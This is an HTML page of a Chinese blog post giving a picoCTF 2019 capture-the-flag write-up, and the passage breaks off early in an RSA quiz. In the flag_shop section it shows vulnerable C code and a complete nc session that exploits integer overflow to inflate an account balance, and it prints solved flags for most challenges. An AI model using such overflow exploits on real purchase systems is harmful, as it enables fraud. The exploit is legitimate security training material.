@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>2019picoCTF补充wp(10050分记录) | Damya&#39;s Blog | あややこやや</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="个人ctf竞赛">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Damya</h5>
+          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
+            
+              <span>3</span>
+            
+              <span>9</span>
+            
+              <span>7</span>
+            
+              <span>5</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>5</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/DamyaHome" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>2019picoCTF补充wp(10050分记录)</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">2019picoCTF补充wp(10050分记录)</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-12-04T12:34:49.000Z" itemprop="datePublished" class="page-time">
+  2019-12-04
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-2019picoCTF补充wp-10050分记录"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">2019picoCTF补充wp(10050分记录)</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-12-04 20:34:49" datetime="2019-12-04T12:34:49.000Z"  itemprop="datePublished">2019-12-04</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="一般技能-General-Skills"><a href="#一般技能-General-Skills" class="headerlink" title="一般技能(General Skills)"></a>一般技能(General Skills)</h1><h2 id="whats-the-difference-Points-200"><a href="#whats-the-difference-Points-200" class="headerlink" title="whats-the-difference - Points: 200"></a>whats-the-difference - Points: 200</h2><blockquote>
+<p>Can you spot the difference? kitters cattos. They are also available at /problems/whats-the-difference_0_00862749a2aeb45993f36cc9cf98a47a on the shell server<br>Hints: How do you find the difference between two files?<br>Dumping the data from a hex editor may make it easier to compare.</p>
+</blockquote>
+<p>这题我完全没有思路,看了github 上ajolliet师傅的wp发现自己学到了很多</p>
+<p>以下是解题过程:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C kitters.jpg &gt; kittersfile</span><br><span class="line">hexdump -C cattos.jpg &gt; cattosfile</span><br><span class="line">diff -c kittersfile cattosfile | grep <span class="string">"^!"</span></span><br></pre></td></tr></table></figure>
+<p>使用diff命令能很快的比较出两个文件的不同,<code>grep &quot;^!&quot;</code>能把不同的行数行在一起进行对比,于是将不同的地方放在一起比较,提取字符就能得到flag(数据太长就不贴出来了)<br>picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}</p>
+<h2 id="flag-shop-Points-300"><a href="#flag-shop-Points-300" class="headerlink" title="flag_shop - Points: 300"></a>flag_shop - Points: 300</h2><blockquote>
+<p>There’s a flag shop selling stuff, can you buy a flag? Source. Connect with nc 2019shell1.picoctf.com 14937.<br>Hints: Two’s compliment can do some weird things when numbers get really big!</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">int</span> con;</span><br><span class="line">    con = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> account_balance = <span class="number">1100</span>;</span><br><span class="line">    <span class="keyword">while</span>(con == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to the flag exchange\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"We sell flags\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n1. Check Account Balance\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n2. Buy Flags\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n3. Exit\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> menu;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n Enter a menu selection\n"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line">        <span class="keyword">if</span>(menu == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\n\n Balance: %d \n\n\n"</span>, account_balance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(menu == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Currently for sale\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"1. Defintely not the flag Flag\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"2. 1337 Flag\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> auction_choice;</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;auction_choice);</span><br><span class="line">            <span class="keyword">if</span>(auction_choice == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"These knockoff Flags cost 900 each, enter desired quantity\n"</span>);</span><br><span class="line">                <span class="keyword">int</span> number_flags = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number_flags);</span><br><span class="line">                <span class="keyword">if</span>(number_flags &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> total_cost = <span class="number">0</span>;</span><br><span class="line">                    total_cost = <span class="number">900</span>*number_flags;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\nThe final cost is: %d\n"</span>, total_cost);</span><br><span class="line">                    <span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">                        account_balance = account_balance - total_cost;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nYour current balance after transaction: %d\n\n"</span>, account_balance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Not enough funds to complete purchase\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(auction_choice == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"1337 flags cost 100000 dollars, and we only have 1 in stock\n"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Enter 1 to buy one"</span>);</span><br><span class="line">                <span class="keyword">int</span> bid = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bid);</span><br><span class="line">                <span class="keyword">if</span>(bid == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(account_balance &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                        FILE *f = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">                        <span class="keyword">if</span>(f == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"flag not found: please run this on the server\n"</span>);</span><br><span class="line">                            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">                        fgets(buf, <span class="number">63</span>, f);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"YOUR FLAG IS: %s\n"</span>, buf);</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nNot enough funds for transaction\n\n\n"</span>);</span><br><span class="line">                    &#125;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            con = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个商店系统实现的功能有进货劣质品和购买真品,但在代码中存在一个漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">	account_balance = account_balance - total_cost;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nYour current balance after transaction: %d\n\n"</span>, account_balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>当<code>account_balance - total_cost</code>为负数时,他的值会变成正数赋给<code>account_balance</code>,将会使你的账户余额增加,而购买一件劣质品成本需要900块,所以只要使你的进货成本比售价高,就有足够的钱买1337个flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">nc 2019shell1.picoctf.com 14937</span><br><span class="line">Welcome to the flag exchange</span><br><span class="line">We sell flags</span><br><span class="line">1. Check Account Balance</span><br><span class="line">2. Buy Flags</span><br><span class="line">3. Exit</span><br><span class="line"> Enter a menu selection</span><br><span class="line">2</span><br><span class="line">Currently for sale</span><br><span class="line">1. Defintely not the flag Flag</span><br><span class="line">2. 1337 Flag</span><br><span class="line">1</span><br><span class="line">These knockoff Flags cost 900 each, enter desired quantity</span><br><span class="line">2147468647</span><br><span class="line">The final cost is: -13500900</span><br><span class="line">Your current balance after transaction: 13502000</span><br><span class="line">Welcome to the flag exchange</span><br><span class="line">We sell flags</span><br><span class="line">1. Check Account Balance</span><br><span class="line">2. Buy Flags</span><br><span class="line">3. Exit</span><br><span class="line"> Enter a menu selection</span><br><span class="line">2</span><br><span class="line">Currently for sale</span><br><span class="line">1. Defintely not the flag Flag</span><br><span class="line">2. 1337 Flag</span><br><span class="line">2</span><br><span class="line">1337 flags cost 100000 dollars, and we only have 1 in stock</span><br><span class="line">Enter 1 to buy one1</span><br><span class="line">YOUR FLAG IS: picoCTF&#123;m0n3y_bag5_e062f0fd&#125;</span><br></pre></td></tr></table></figure></p>
+<p>picoCTF{m0n3y_bag5_e062f0fd}</p>
+<h2 id="mus1c-Points-300"><a href="#mus1c-Points-300" class="headerlink" title="mus1c - Points: 300"></a>mus1c - Points: 300</h2><blockquote>
+<p>I wrote you a song. Put it in the picoCTF{} flag format<br>Hints: Do you think you can master rockstar?</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Pico&apos;s a CTFFFFFFF</span><br><span class="line">my mind is waitin</span><br><span class="line">It&apos;s waitin</span><br><span class="line">Put my mind of Pico into This</span><br><span class="line">my flag is not found</span><br><span class="line">put This into my flag</span><br><span class="line">put my flag into Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">My song&apos;s something</span><br><span class="line">put Pico into This</span><br><span class="line">Knock This down, down, down</span><br><span class="line">put This into CTF</span><br><span class="line">shout CTF</span><br><span class="line">my lyric is nothing</span><br><span class="line">Put This without my song into my lyric</span><br><span class="line">Knock my lyric down, down, down</span><br><span class="line">shout my lyric</span><br><span class="line">Put my lyric into This</span><br><span class="line">Put my song with This into my lyric</span><br><span class="line">Knock my lyric down</span><br><span class="line">shout my lyric</span><br><span class="line">Build my lyric up, up ,up</span><br><span class="line">shout my lyric</span><br><span class="line">shout Pico</span><br><span class="line">shout It</span><br><span class="line">Pico CTF is fun</span><br><span class="line">security is important</span><br><span class="line">Fun is fun</span><br><span class="line">Put security with fun into Pico CTF</span><br><span class="line">Build Fun up</span><br><span class="line">shout fun times Pico CTF</span><br><span class="line">put fun times Pico CTF into my song</span><br><span class="line">build it up</span><br><span class="line">shout it</span><br><span class="line">shout it</span><br><span class="line">build it up, up</span><br><span class="line">shout it</span><br><span class="line">shout Pico</span><br></pre></td></tr></table></figure>
+<p>这道题和NCTF的某题很像,可以用这个网址解密 <a href="https://codewithrockstar.com/" target="_blank" rel="noopener">https://codewithrockstar.com/</a><br><figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./1.png" title="图片" data-fancybox="images"><img src="./1.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<p>将ascil码转成文本,得到flag</p>
+<p>picoCTF{rrrocknrn0113r}</p>
+<h2 id="1-wanna-b3-a-r0ck5tar-Points-350"><a href="#1-wanna-b3-a-r0ck5tar-Points-350" class="headerlink" title="1_wanna_b3_a_r0ck5tar - Points: 350"></a>1_wanna_b3_a_r0ck5tar - Points: 350</h2><blockquote>
+<p>I wrote you another song. Put the flag in the picoCTF{} flag format</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Rocknroll is right              </span><br><span class="line">Silence is wrong                </span><br><span class="line">A guitar is a six-string        </span><br><span class="line">Tommy&apos;s been down               </span><br><span class="line">Music is a billboard-burning razzmatazz!</span><br><span class="line">Listen to the music             </span><br><span class="line">If the music is a guitar                  </span><br><span class="line">Say &quot;Keep on rocking!&quot;                </span><br><span class="line">Listen to the rhythm</span><br><span class="line">If the rhythm without Music is nothing</span><br><span class="line">Tommy is rockin guitar</span><br><span class="line">Shout Tommy!                    </span><br><span class="line">Music is amazing sensation </span><br><span class="line">Jamming is awesome presence</span><br><span class="line">Scream Music!                   </span><br><span class="line">Scream Jamming!                 </span><br><span class="line">Tommy is playing rock           </span><br><span class="line">Scream Tommy!       </span><br><span class="line">They are dazzled audiences                  </span><br><span class="line">Shout it!</span><br><span class="line">Rock is electric heaven                     </span><br><span class="line">Scream it!</span><br><span class="line">Tommy is jukebox god            </span><br><span class="line">Say it!                                     </span><br><span class="line">Break it down</span><br><span class="line">Shout &quot;Bring on the rock!&quot;</span><br><span class="line">Else Whisper &quot;That ain&apos;t it, Chief&quot;                 </span><br><span class="line">Break it down</span><br></pre></td></tr></table></figure>
+<p>跟着github看了一通rockstar语言,长见识了,然后决定使用rockstar-py工具,将rock文件转换成python语言(只支持python3运行)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -W ignore -m rockstarpy lyrics2.rock</span><br></pre></td></tr></table></figure></p>
+<p>转换后的文本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Rocknroll = <span class="literal">True</span></span><br><span class="line">Silence = <span class="literal">False</span></span><br><span class="line">a_guitar = <span class="number">19</span></span><br><span class="line">Tommy = <span class="number">44</span></span><br><span class="line">Music = <span class="number">160</span></span><br><span class="line">the_music = input()</span><br><span class="line"><span class="keyword">if</span> the_music == a_guitar:</span><br><span class="line">    print(<span class="string">"Keep on rocking!"</span>)</span><br><span class="line">    the_rhythm = input()</span><br><span class="line">    <span class="keyword">if</span> the_rhythm - Music == <span class="literal">False</span>:</span><br><span class="line">        Tommy = <span class="number">66</span></span><br><span class="line">        print(Tommy!)</span><br><span class="line">        Music = <span class="number">79</span></span><br><span class="line">        Jamming = <span class="number">78</span></span><br><span class="line">        print(Music!)</span><br><span class="line">        print(Jamming!)</span><br><span class="line">        Tommy = <span class="number">74</span></span><br><span class="line">        print(Tommy!)</span><br><span class="line">        They are dazzled audiences</span><br><span class="line">        print(it!)</span><br><span class="line">        Rock = <span class="number">86</span></span><br><span class="line">        print(it!)</span><br><span class="line">        Tommy = <span class="number">73</span></span><br><span class="line">        print(it!)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">"Bring on the rock!"</span>)</span><br><span class="line">        Else print(<span class="string">"That ain't it, Chief"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>再将ascil码转换成字符<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = [<span class="number">66</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">74</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">73</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'picoCTF&#123;&#123;&#123;&#125;&#125;&#125;'</span>.format(<span class="string">''</span>.join(map(chr, r)))</span><br></pre></td></tr></table></figure></p>
+<figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./2.png" title="图片" data-fancybox="images"><img src="./2.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{BONJOVI}</p>
+<h1 id="密码学-Cryptography"><a href="#密码学-Cryptography" class="headerlink" title="密码学(Cryptography)"></a>密码学(Cryptography)</h1><h2 id="Mr-Worldwide-Points-200"><a href="#Mr-Worldwide-Points-200" class="headerlink" title="Mr-Worldwide - Points: 200"></a>Mr-Worldwide - Points: 200</h2><blockquote>
+<p>A musician left us a message. What’s it mean?</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)&#125;</span><br></pre></td></tr></table></figure>
+<p>将坐标点对应google地图,得到一串城市坐标<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;</span><br><span class="line">2QH3+86 Kyoto, Japan</span><br><span class="line">FP9R+Q9 Odesa, Odessa Oblast, Ukraine</span><br><span class="line">QR55+H9 Dayton, Ohio, USA</span><br><span class="line">2X8H+3R Istanbul(Eminönü, Rüstem Paşa, Fatih/İstanbul, Turkey)</span><br><span class="line">F988+MM Abu Dhabi - United Arab Emirates</span><br><span class="line">4MRV+87 Kuala Lumpur, Federal Territory of Kuala Lumpur, Malaysia</span><br><span class="line">_</span><br><span class="line">2Q47+5C Addis Ababa, Ethiopia</span><br><span class="line">2Q6W+9H Loja, Ecuador</span><br><span class="line">9VHW+5R Amsterdam, Netherlands</span><br><span class="line">34PR+7J Sleepy Hollow, New York, USA</span><br><span class="line">QHRV+24 Kodiak, Alaska, USA</span><br><span class="line">6W4F+8R Alexandria, Egypt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>提取每个城市名的首位字母,得到flag<br>picoCTF{KODIAK_ALASKA}</p>
+<h2 id="rsa-pop-quiz-Points-200"><a href="#rsa-pop-quiz-Points-200" class="headerlink" title="rsa-pop-quiz - Points: 200"></a>rsa-pop-quiz - Points: 200</h2><blockquote>
+<p>Class, take your seats! It’s PRIME-time for a quiz… nc 2019shell1.picoctf.com 61751<br>RSA <a href="https://simple.wikipedia.org/wiki/RSA_algorithm" target="_blank" rel="noopener">info</a></p>
+</blockquote>
+<p>nc过去后会出很多道关于rsa的题目</p>
+<p>第一题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 60413</span><br><span class="line">p : 76753</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">n</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">n: 4636878989</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure>
